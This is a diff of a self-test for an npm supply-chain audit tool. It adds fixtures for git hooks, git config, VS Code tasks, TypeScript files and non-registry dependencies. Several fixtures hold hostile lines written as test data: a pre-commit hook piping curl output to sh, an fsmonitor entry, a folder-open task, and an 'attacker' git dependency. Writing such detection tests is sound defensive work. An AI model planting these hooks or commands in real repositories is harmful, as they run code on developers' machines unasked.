@@ -1,4 +1,4 @@
-// Self test: builds two tiny fixture projects in a temp folder and checks the audit result.
+// Self test: builds tiny fixture projects in a temp folder and checks audit results.
 const { spawnSync } = require("child_process");
 const fs = require("fs");
 const os = require("os");
@@ -13,6 +13,7 @@ const write = (rel, text) => {
 
 write("clean/package.json", JSON.stringify({ name: "clean", scripts: { test: "node index.js" } }));
 write("clean/index.js", 'console.log("hello");\n');
+
 write("bad/package.json", JSON.stringify({ name: "bad", scripts: { postinstall: "node setup.js" } }));
 write("bad/setup.js", [
   'const cp = require("child_process");',
@@ -21,40 +22,107 @@ write("bad/setup.js", [
   "console.log(payload, where, typeof cp);",
 ].join("\n"));
 
-// Repo delivered as a zip with .git included: a real hook, a harmless sample, a risky config line.
-write("hooked/package.json", JSON.stringify({ name: "hooked" }));
-write("hooked/.git/hooks/post-checkout", "#!/bin/sh\ncurl -sL http://example.invalid/task | bash > /dev/null 2>&1 &\n");
-write("hooked/.git/hooks/pre-commit.sample", "#!/bin/sh\nexit 0\n");
-write("hooked/.git/config", "[core]\n\tbare = false\n\thooksPath = .githooks\n[alias]\n\tst = status\n");
-write("hooked/.vscode/tasks.json", '{"tasks":[{"label":"setup","command":"node x.js","runOptions":{"runOn":"folderOpen"}}]}');
-// Normal clone: only sample hooks and a plain config, must stay clean.
-write("cloned/package.json", JSON.stringify({ name: "cloned", scripts: { test: "node index.js" } }));
-write("cloned/.git/hooks/pre-push.sample", "#!/bin/sh\nexit 0\n");
-write("cloned/.git/config", "[core]\n\tbare = false\n[alias]\n\tst = status\n");
+// Git hooks fixture (v1.1.0 feature)
+write("githook/.git/hooks/pre-commit", "#!/bin/sh\ncurl -s https://example.com/x | sh\n");
+write("githook/package.json", JSON.stringify({ name: "githook" }));
 
-const run = (dir) => spawnSync(process.execPath, [path.join(__dirname, "audit.js"), dir], { encoding: "utf8" });
+// Git config fixture (v1.1.0 feature)
+write("gitcfg/.git/config", '[core]\n\thooksPath = .hooks\n\tfsmonitor = evil-bin\n');
+write("gitcfg/package.json", JSON.stringify({ name: "gitcfg" }));
+
+// VS Code task fixture (v1.1.0 feature)
+write("vscodepad/.vscode/tasks.json", JSON.stringify({ tasks: [{ runOptions: { runOn: "folderOpen" } }] }));
+write("vscodepad/package.json", JSON.stringify({ name: "vscodepad" }));
+
+// TypeScript fixtures (PR #4 feature)
+write("ts-bad/package.json", JSON.stringify({ name: "ts-bad", scripts: { test: "tsc" } }));
+write("ts-bad/src/setup.ts", 'import { execSync } from "child_process";\nexecSync("echo hi");\n');
+write("ts-bad/src/helper.mts", 'const x = eval("1+1");\n');
+write("ts-bad/src/types.cts", '// plain type-only file, safe\nexport type Foo = string;\n');
+
+write("ts-clean/package.json", JSON.stringify({ name: "ts-clean" }));
+write("ts-clean/src/index.ts", 'export const greet = (name: string) => `Hello, ${name}`;\n');
+
+// Non-registry dependency fixtures (PR #4 feature)
+write(
+  "git-dep/package.json",
+  JSON.stringify({
+    name: "git-dep",
+    dependencies: {
+      "safe-pkg": "^1.0.0",
+      "risky-git": "git+https://github.com/attacker/pkg.git",
+      "risky-tgz": "https://example.com/pkg.tgz",
+      "local-hack": "file:../internal",
+    },
+  })
+);
+
+const run = (dir, extra = []) =>
+  spawnSync(process.execPath, [path.join(__dirname, "audit.js"), ...extra, dir], { encoding: "utf8" });
+
 let ok = true;
-const check = (name, cond) => { console.log((cond ? "PASS " : "FAIL ") + name); if (!cond) ok = false; };
+const check = (name, cond) => {
+  console.log((cond ? "PASS " : "FAIL ") + name);
+  if (!cond) ok = false;
+};
 
+// Version check (v1.1.0)
+const v = spawnSync(process.execPath, [path.join(__dirname, "audit.js"), "--version"], { encoding: "utf8" });
+check("--version prints version", v.status === 0 && /npm-install-audit 1\.1\.0/.test(v.stdout));
+
+// Original checks
 const clean = run(path.join(tmp, "clean"));
 check("clean fixture exits 0", clean.status === 0);
+
 const bad = run(path.join(tmp, "bad"));
 check("bad fixture exits 1", bad.status === 1);
 check("flags postinstall hook", /postinstall hook runs/.test(bad.stdout));
 check("flags shell execution", /runs shell commands/.test(bad.stdout));
 check("flags base64 decoding", /decodes base64/.test(bad.stdout));
 check("flags key paths", /key, wallet or browser data paths/.test(bad.stdout));
-const hooked = run(path.join(tmp, "hooked"));
-check("hooked fixture exits 1", hooked.status === 1);
-check("flags active git hook", /post-checkout: active git hook/.test(hooked.stdout));
-check("flags hook that downloads and runs code", /downloads and runs code/.test(hooked.stdout));
-check("ignores .sample hooks", !/pre-commit\.sample/.test(hooked.stdout));
-check("flags core.hooksPath", /core\.hooksPath/.test(hooked.stdout));
-check("flags VS Code folderOpen task", /folder is opened/.test(hooked.stdout));
-check("plain alias is not flagged", !/st = status/.test(hooked.stdout));
-const cloned = run(path.join(tmp, "cloned"));
-check("normal clone with sample hooks exits 0", cloned.status === 0);
 check("missing directory exits 2", run(path.join(tmp, "nope")).status === 2);
+
+// v1.1.0 checks: git hooks, git config, VS Code
+const gh = run(path.join(tmp, "githook"));
+check("flags active git hook with payload", /active git hook.*downloads and runs code/.test(gh.stdout));
+
+const gc = run(path.join(tmp, "gitcfg"));
+check("flags hooksPath in git config", /hooksPath points git hooks/.test(gc.stdout));
+check("flags fsmonitor in git config", /fsmonitor runs a program/.test(gc.stdout));
+
+const vc = run(path.join(tmp, "vscodepad"));
+check("flags VS Code folderOpen task", /VS Code task runs when the folder is opened/.test(vc.stdout));
+
+// PR #4: TypeScript checks
+const tsBad = run(path.join(tmp, "ts-bad"));
+check("ts-bad fixture exits 1", tsBad.status === 1);
+check("flags .ts exec in ts file", /runs shell commands/.test(tsBad.stdout));
+check("flags eval in .mts file", /evaluates code at runtime/.test(tsBad.stdout));
+
+const tsClean = run(path.join(tmp, "ts-clean"));
+check("ts-clean fixture exits 0", tsClean.status === 0);
+
+// PR #4: Non-registry dependency checks
+const gitDep = run(path.join(tmp, "git-dep"));
+check("git-dep fixture exits 1", gitDep.status === 1);
+check("flags git+https dep", /git URL dependency/.test(gitDep.stdout));
+check("flags tarball URL dep", /tarball URL dependency/.test(gitDep.stdout));
+check("flags file: dep", /local file: dependency/.test(gitDep.stdout));
+check("does not flag safe semver", !gitDep.stdout.includes('"safe-pkg"'));
+
+// PR #4: --json flag checks
+const jsonClean = run(path.join(tmp, "clean"), ["--json"]);
+check("--json clean exits 0", jsonClean.status === 0);
+check("--json clean is valid JSON", (() => { try { JSON.parse(jsonClean.stdout); return true; } catch { return false; } })());
+check("--json clean is empty array", JSON.parse(jsonClean.stdout).length === 0);
+
+const jsonBad = run(path.join(tmp, "bad"), ["--json"]);
+check("--json bad exits 1", jsonBad.status === 1);
+const parsed = (() => { try { return JSON.parse(jsonBad.stdout); } catch { return null; } })();
+check("--json bad is valid JSON", parsed !== null);
+check("--json findings have file", parsed && parsed.every((f) => typeof f.file === "string"));
+check("--json findings have rule", parsed && parsed.every((f) => typeof f.rule === "string"));
+check("--json findings have message", parsed && parsed.every((f) => typeof f.message === "string"));
 
 fs.rmSync(tmp, { recursive: true, force: true });
 process.exit(ok ? 0 : 1);
